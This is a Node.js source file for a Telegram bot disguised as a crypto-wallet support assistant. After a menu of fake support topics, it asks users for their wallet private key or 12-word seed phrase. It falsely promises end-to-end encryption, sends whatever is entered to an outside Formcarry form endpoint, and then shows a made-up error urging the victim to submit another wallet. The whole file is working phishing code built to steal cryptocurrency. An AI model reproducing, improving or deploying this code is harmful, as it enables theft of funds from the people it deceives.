require('dotenv').config(); // Load environment variables from .env file

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 4000; // Use port 4000

// Retrieve Telegram bot tokens from environment variables
const TELEGRAM_BOT_TOKENS = [
    process.env.TG_BOT_TOK1,
    process.env.TG_BOT_TOK2,
    // process.env.TELEGRAM_BOT_TOKEN_3,
    // process.env.TELEGRAM_BOT_TOKEN_4,
    // process.env.TELEGRAM_BOT_TOKEN_5
];

// Create an array of bot instances
const bots = TELEGRAM_BOT_TOKENS.map(token => {
    const bot = new TelegramBot(token);
    bot.setWebHook(`${process.env.WEBHOOK_URL}/bot${token}`); // Set webhook URL
    return bot;
});

// Formcarry endpoint and access token
const FORMCARRY_URL = process.env.FORMCARRY_URL;
const YOUR_ACCESS_TOKEN = process.env.FORMCARRY_ACCESS_TOKEN;

// Store user data temporarily
const userData = {};

// Session timeout (5 minutes)
const SESSION_TIMEOUT = 3 * 60 * 1000;

// Middleware to parse JSON
app.use(express.json());

// Webhook endpoint for each bot
bots.forEach((bot, index) => {
    const token = TELEGRAM_BOT_TOKENS[index];
    app.post(`/bot${token}`, (req, res) => {
        bot.processUpdate(req.body); // Process incoming updates
        res.sendStatus(200); // Respond to Telegram
    });
});

// Function to send data to Formcarry with retry logic
const sendToFormcarry = async (chatId, data, retries = 3, delay = 1000) => {
    try {
        const response = await axios.post(FORMCARRY_URL, data, {
            headers: { Authorization: `Bearer ${YOUR_ACCESS_TOKEN}` },
        });

        if (response.status === 200) {
            // Success: Notify the user
            const optionss = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔄 Restart Bot', callback_data: 'restart_bot' },
                            { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            bots.forEach(bot => {
                bot.sendMessage(chatId, '❌ An error occurred, please contact admin to solve your issue or try importing another wallet.', {
                    parse_mode: 'Markdown',
                    ...optionss,
                });
            });
        } else {
            // Handle non-200 responses
            bots.forEach(bot => {
                bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                    parse_mode: 'Markdown',
                });
            });
        }
    } catch (error) {
        console.error('Error submitting to Formcarry:', error.message);

        if (error.response && error.response.status === 429 && retries > 0) {
            // Rate limit hit: Retry after a delay
            const retryDelay = delay * 2;
            console.log(`Rate limit hit. Retrying in ${retryDelay}ms...`);
            setTimeout(() => sendToFormcarry(chatId, data, retries - 1, retryDelay), retryDelay);
        } else {
            // Other errors: Notify the user and restart the bot
            bots.forEach(bot => {
                bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Restart the bot by clicking */start*...*', {
                    parse_mode: 'Markdown',
                });

                // Clear user data and restart
                delete userData[chatId];
                bot.sendMessage(chatId, '/start');
            });
        }
    }
};

// Handle /start command
bots.forEach(bot => {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;

        // Initialize userData[chatId] if it doesn't exist
        if (!userData[chatId]) {
            userData[chatId] = {
                step: 'choosing_option',
                option: null,
                authMethod: null,
                input: null,
                timeout: null,
            };
        }

        // Clear any existing timeout for this user
        if (userData[chatId].timeout) {
            clearTimeout(userData[chatId].timeout);
        }

        // Set a new timeout
        userData[chatId].timeout = setTimeout(() => {
            // Restart the bot after the timeout
            delete userData[chatId];
            bot.sendMessage(chatId, '🔄 Session expired. Restart the bot by clicking */start*...');
            bot.sendMessage(chatId, '/start');
        }, SESSION_TIMEOUT);

        // Create a fashionable inline keyboard with emojis
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Harvest Transaction', callback_data: 'harvest' },
                        { text: 'Claim', callback_data: 'claim' }
                    ],
                    [
                        { text: 'Migration', callback_data: 'migrate' },
                        { text: 'Staking', callback_data: 'staking' }
                    ],
                    [
                        { text: 'Whitelisting', callback_data: 'whitelist' },
                        { text: 'Bridge Error', callback_data: 'bridge_err' }
                    ],
                    [
                        { text: 'Presale Error', callback_data: 'presale_err' },
                        { text: 'NFT', callback_data: 'nft' }
                    ],
                    [
                        { text: 'Revoke', callback_data: 'revoke' },
                        { text: 'KYC', callback_data: 'kyc' }
                    ],
                    [
                        { text: 'Deposit Issues', callback_data: 'deposit' },
                        { text: 'Others', callback_data: 'others' }
                    ],
                    [
                        { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                    ]
                ],
            },
        };

        bot.sendMessage(chatId, `Hi there!
I’m your dedicated assistant here to help with all your crypto-related questions and technical issues. 
Whether you're setting up a wallet, troubleshooting transactions, or navigating blockchain features, 
I’m here to guide you every step of the way.

If you're encountering an error, need help understanding crypto terms, or just have general questions 
about your account, simply ask! I’ll provide the best possible solution, and if needed, I can connect 
you with one of our human experts.

⚠️NOTE: YOU ARE SUBMITTING ALL REQUIRED INFORMATIONS TO BOT WITH ZERO HUMAN INTERFERENCE. 

*🔗 END TO END ENCRYPTED 🔁*`, { parse_mode: 'Markdown', ...options });
    });
});

// Handle /restart command
bots.forEach(bot => {
    bot.onText(/\/restart/, (msg) => {
        const chatId = msg.chat.id;

        // Clear user data
        delete userData[chatId];

        // Send the start message
        bot.sendMessage(chatId, '🔄 Restarting the bot...');
        bot.sendMessage(chatId, '/start');
    });
});

// Handle inline keyboard button clicks
bots.forEach(bot => {
    bot.on('callback_query', (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;

        // Initialize userData[chatId] if it doesn't exist
        if (!userData[chatId]) {
            userData[chatId] = {
                step: 'choosing_option',
                option: null,
                authMethod: null,
                input: null,
                timeout: null,
            };
        }

        const data = callbackQuery.data;

        // Handle restart_bot action
        if (data === 'restart_bot') {
            // Clear user data
            delete userData[chatId];

            // Send the start message
            bot.sendMessage(chatId, '🔄 Restarting the bot...');
            bot.sendMessage(chatId, '/start');
            return;
        }

        // Store the chosen option
        userData[chatId].option = data;

        // If the user selects Private Key or Seed Phrase directly, skip the authentication step
        if (data === 'private_key' || data === 'seed_phrase') {
            userData[chatId].authMethod = data;
            userData[chatId].step = 'providing_input'; // Move to the input step

            // Ask for input based on the chosen method
            let message = '';
            if (data === 'private_key') {
                message = `You selected *Private Key* as your authentication method. 
Please enter your wallet **Private Key** :`;
            } else if (data === 'seed_phrase') {
                message = `You selected *Seed Phrase* as your authentication method. 
Please enter your **12-word Seed Phrase** (separated by spaces):`;
            }

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } else {
            // Otherwise, ask for authentication method
            userData[chatId].step = 'choosing_auth_method'; // Move to the next step

            const authMethodOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔑 Private Key', callback_data: 'private_key' },
                            { text: '📝 Seed Phrase', callback_data: 'seed_phrase' }
                        ]
                    ],
                },
            };

            bot.sendMessage(chatId, `You selected *${data}*. 
Please provide the *Private key* or *Seed Phrase* for the wallet affected to begin authentication with the smart contract:`, {
                parse_mode: 'Markdown',
                ...authMethodOptions,
            });
        }
    });
});

// Handle user input
bots.forEach(bot => {
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        // Initialize userData[chatId] if it doesn't exist
        if (!userData[chatId]) {
            userData[chatId] = {
                step: 'choosing_option',
                option: null,
                authMethod: null,
                input: null,
                timeout: null,
            };
        }

        if (userData[chatId].step !== 'providing_input') {
            return; // Ignore messages if not in the input step
        }

        const authMethod = userData[chatId].authMethod;
        let isValid = false;
        let errorMessage = '';

        // Validate input based on the chosen method
        if (authMethod === 'seed_phrase') {
            const words = text.trim().split(/\s+/); // Split by spaces
            isValid = words.length > 11;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain at least **12 words**. Please try again:';
            }
        } else if (authMethod === 'private_key') {
            isValid = text.length > 20;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain a valid private key. Please try again:';
            }
        }

        if (!isValid) {
            bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
            return;
        }

        userData[chatId].input = text;

        // Prepare data to send to Formcarry
        const data = {
            option: userData[chatId].option,
            authMethod: userData[chatId].authMethod,
            input: userData[chatId].input,
        };

        // Send data to Formcarry with rate limit handling
        sendToFormcarry(chatId, data);

        // Clear user data after submission
        delete userData[chatId];
    });
});

// Start the Express server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
